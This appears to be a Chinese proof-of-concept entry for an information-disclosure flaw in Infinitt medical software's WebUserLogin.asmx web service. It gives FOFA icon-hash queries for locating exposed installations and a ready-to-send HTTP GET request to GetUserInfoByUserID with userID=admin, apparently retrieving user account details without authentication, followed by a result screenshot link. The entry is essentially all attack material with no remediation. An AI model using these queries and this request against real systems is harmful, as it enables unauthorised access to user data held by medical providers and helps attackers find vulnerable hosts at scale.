# 英飞达医学WebUserLogin.asmx信息泄露

## fofa

```javascript
icon_hash="1474455751" || icon_hash="702238928"
```

## poc

```javascript
GET /webservices/WebUserLogin.asmx/GetUserInfoByUserID?userID=admin HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Connection: keep-alive
```

![image-20241018160036699](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410181600771.png)